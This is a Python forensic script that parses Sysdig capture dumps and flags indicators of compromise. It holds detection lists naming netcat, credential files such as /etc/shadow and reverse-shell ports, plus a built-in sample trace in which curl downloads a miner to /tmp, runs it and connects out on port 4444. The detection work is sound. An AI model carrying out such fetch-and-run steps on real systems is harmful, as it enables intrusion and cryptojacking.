#!/usr/bin/env python3
"""
Sysdig Capture & Trace Log Forensic Parser.
Analyzes Sysdig capture log streams or text dumps, extracting process trees,
network connections, file modifications, and flagging potential indicators of compromise (IoCs).

Usage:
    python3 parse_sysdig_capture.py --input capture-sample.txt
    python3 parse_sysdig_capture.py --sample-demo
"""

import argparse
import collections
import json
import re
import sys
from typing import List, Dict, Any

SUSPICIOUS_PATHS = [
    "/tmp/", "/dev/shm/", "/var/tmp/", "/etc/shadow", "/etc/sudoers", "/root/.ssh"
]

SUSPICIOUS_PROCS = [
    "nc", "netcat", "ncat", "nmap", "tcpdump", "wireshark", "hydra", "john"
]

SUSPICIOUS_PORTS = {4444, 1337, 6667, 8888, 9999, 31337}

SAMPLE_LOG_EVENTS = """
12:00:01.123 0 java (c_abc123) > execve filename=/usr/bin/java
12:00:02.456 0 curl (c_abc123) > execve filename=/usr/bin/curl args=http://198.51.100.23/miner -o /tmp/miner
12:00:02.789 0 chmod (c_abc123) > execve filename=/bin/chmod args=+x /tmp/miner
12:00:03.012 0 miner (c_abc123) > execve filename=/tmp/miner
12:00:03.345 0 miner (c_abc123) > connect fd=4(198.51.100.23:4444)
12:00:04.567 1000 node (c_def456) > openat fd=3(/app/server.js) flags=O_RDONLY
"""

def parse_trace_lines(lines: List[str]) -> Dict[str, Any]:
    procs = collections.Counter()
    connections = collections.Counter()
    file_writes = collections.Counter()
    flags = []

    for idx, raw_line in enumerate(lines):
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue

        # Check for process execution
        if "execve" in line:
            match_file = re.search(r"filename=([^\s]+)", line)
            proc_file = match_file.group(1) if match_file else "unknown"
            procs[proc_file] += 1

            for s_proc in SUSPICIOUS_PROCS:
                if s_proc in proc_file.lower():
                    flags.append({
                        "line": idx + 1,
                        "severity": "HIGH",
                        "type": "SUSPICIOUS_TOOL",
                        "details": f"Suspicious offensive utility executed: {proc_file}"
                    })

            for s_path in ["/tmp/", "/dev/shm/", "/var/tmp/"]:
                if proc_file.startswith(s_path):
                    flags.append({
                        "line": idx + 1,
                        "severity": "CRITICAL",
                        "type": "DRIFT_EXECUTION",
                        "details": f"Executable drift detected running out of ephemeral storage: {proc_file}"
                    })

        # Check for network connect
        if "connect" in line:
            match_conn = re.search(r"\((\d+\.\d+\.\d+\.\d+):(\d+)\)", line)
            if match_conn:
                ip, port_str = match_conn.group(1), match_conn.group(2)
                port = int(port_str)
                connections[f"{ip}:{port}"] += 1

                if port in SUSPICIOUS_PORTS:
                    flags.append({
                        "line": idx + 1,
                        "severity": "CRITICAL",
                        "type": "SUSPICIOUS_PORT_CONNECT",
                        "details": f"Outbound connection established to high-risk port {port} ({ip})"
                    })

        # Check for sensitive path access
        for s_path in SUSPICIOUS_PATHS:
            if s_path in line and ("open" in line or "unlink" in line or "write" in line):
                file_writes[s_path] += 1
                if s_path in ("/etc/shadow", "/etc/sudoers", "/root/.ssh"):
                    flags.append({
                        "line": idx + 1,
                        "severity": "CRITICAL",
                        "type": "SENSITIVE_CREDENTIAL_ACCESS",
                        "details": f"Sensitive file descriptor activity: {s_path}"
                    })

    return {
        "total_lines_analyzed": len(lines),
        "unique_processes": dict(procs.most_common(10)),
        "network_endpoints": dict(connections.most_common(10)),
        "sensitive_file_hits": dict(file_writes),
        "anomalies_detected": flags
    }

def main():
    parser = argparse.ArgumentParser(description="Sysdig Capture & Trace Forensic Parser")
    parser.add_argument("--input", help="Path to sysdig text capture dump")
    parser.add_argument("--sample-demo", action="store_true", help="Analyze built-in sample compromised trace")
    parser.add_argument("--json", action="store_true", help="Output analysis in JSON format")

    args = parser.parse_args()

    if args.sample_demo:
        lines = SAMPLE_LOG_EVENTS.strip().splitlines()
    elif args.input:
        with open(args.input, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    else:
        print("Please provide --input <file> or use --sample-demo")
        sys.exit(1)

    analysis = parse_trace_lines(lines)

    if args.json:
        print(json.dumps(analysis, indent=2))
    else:
        print("============================================================")
        print(" 🔍 Sysdig Capture Forensic Trace Analyzer")
        print("============================================================")
        print(f"Total events analyzed: {analysis['total_lines_analyzed']}")
        print(f"Anomalies / IoCs flagged: {len(analysis['anomalies_detected'])}\n")

        print("--- Top Executed Binaries ---")
        for proc, cnt in analysis["unique_processes"].items():
            print(f"  • {proc:<35} ({cnt} events)")

        if analysis["network_endpoints"]:
            print("\n--- Network Connections ---")
            for conn, cnt in analysis["network_endpoints"].items():
                print(f"  • {conn:<25} ({cnt} connects)")

        if analysis["anomalies_detected"]:
            print("\n🚨 High-Risk Findings Detected:")
            for flag in analysis["anomalies_detected"]:
                print(f"  [{flag['severity']:<8}] Line {flag['line']}: {flag['type']} -> {flag['details']}")
            sys.exit(1)
        else:
            print("\n✔ Zero indicators of compromise detected in trace.")
            sys.exit(0)

if __name__ == "__main__":
    main()
